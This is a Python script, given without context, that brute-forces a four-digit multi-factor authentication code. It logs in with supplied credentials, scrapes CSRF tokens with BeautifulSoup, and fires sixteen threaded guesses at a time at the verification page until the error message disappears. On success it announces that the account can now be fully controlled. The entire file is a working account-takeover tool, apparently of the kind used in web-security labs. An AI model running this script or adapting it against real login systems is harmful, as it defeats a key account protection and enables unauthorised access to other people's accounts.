import requests
import argparse
import threading
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument("-t", help="Target", dest="Target")
parser.add_argument("-u", help="User", dest="User")
parser.add_argument("-p", help="Password", dest="Password")
args = parser.parse_args()

url = args.Target
User = args.User
Password = args.Password

url2 = url+"2"


def get_csrf(content):
	soup = BeautifulSoup(content, 'lxml')
	csrftoken = soup.find('input', dict(name='csrf'))['value']
	return csrftoken

def post_to_target(num):
	s = requests.Session()
	r = s.get(url)
	csrftoken = get_csrf(r.content)
	parameters = {"csrf": csrftoken, "username": User, "password": Password}
	r = s.post(url, data = parameters)

	csrftoken = get_csrf(r.content)
	parameters = {"csrf":csrftoken,"mfa-code": num}
	r = s.post(url2, data = parameters)
	if "Incorrect security code" not in r.text:
		print("Can do anything with the account now.")
		exit()

def enum(array):
	num1 = array[0]
	num2 = array[1]
	num3 = array[2]
	num4 = array[3]
	num5 = array[4]
	num6 = array[5]
	num7 = array[6]
	num8 = array[7]
	num9 = array[8]
	num10 = array[9]
	num11 = array[10]
	num12 = array[11]
	num13 = array[12]
	num14 = array[13]
	num15 = array[14]
	num16 = array[15]
	t1 = threading.Thread(target=post_to_target, args=(num1,))
	t2 = threading.Thread(target=post_to_target, args=(num2,))
	t3 = threading.Thread(target=post_to_target, args=(num3,))
	t4 = threading.Thread(target=post_to_target, args=(num4,))
	t5 = threading.Thread(target=post_to_target, args=(num5,))
	t6 = threading.Thread(target=post_to_target, args=(num6,))
	t7 = threading.Thread(target=post_to_target, args=(num7,))
	t8 = threading.Thread(target=post_to_target, args=(num8,))
	t9 = threading.Thread(target=post_to_target, args=(num9,))
	t10 = threading.Thread(target=post_to_target, args=(num10,))
	t11 = threading.Thread(target=post_to_target, args=(num11,))
	t12 = threading.Thread(target=post_to_target, args=(num12,))
	t13 = threading.Thread(target=post_to_target, args=(num13,))
	t14 = threading.Thread(target=post_to_target, args=(num14,))
	t15 = threading.Thread(target=post_to_target, args=(num15,))
	t16 = threading.Thread(target=post_to_target, args=(num16,))
	t1.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
	t6.start()
	t7.start()
	t8.start()
	t9.start()
	t10.start()
	t11.start()
	t12.start()
	t13.start()
	t14.start()
	t15.start()
	t16.start()
	t1.join()
	t2.join()
	t3.join()
	t4.join()
	t5.join()
	t6.join()
	t7.join()
	t8.join()
	t9.join()
	t10.join()
	t11.join()
	t12.join()
	t13.join()
	t14.join()
	t15.join()
	t16.join()
array = []
counter = 0
for num in range(1000,9999):
	counter +=1
	array.append(num)
	if len(array) == 16:
		print(array)
		enum(array)
		counter = 0
		array = []
exit()